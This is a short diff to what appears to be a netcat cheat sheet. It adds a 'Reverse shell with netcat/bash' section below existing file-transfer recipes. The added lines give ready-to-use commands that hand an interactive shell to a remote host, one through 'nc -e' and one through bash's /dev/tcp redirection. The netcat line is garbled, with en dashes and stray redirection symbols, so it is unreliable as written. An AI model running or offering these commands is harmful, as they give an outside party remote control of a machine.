@@ -9,3 +9,8 @@ Transfer file:
 Transfer compressed file: 
     receiver: nc -lp <port> | gzip -cd | tar xfp -
     sender:   tar cfp - <dir> | gzip -c | nc -w 3 <host> <port>
+
+Reverse shell with netcat/bash:
+    client: nc –lvp <port>
+    server: nc <host> <port> –e < /bin/bash | cmd.exe > 
+    server: bash -i >& /dev/tcp/<host>/<port> 0>&1
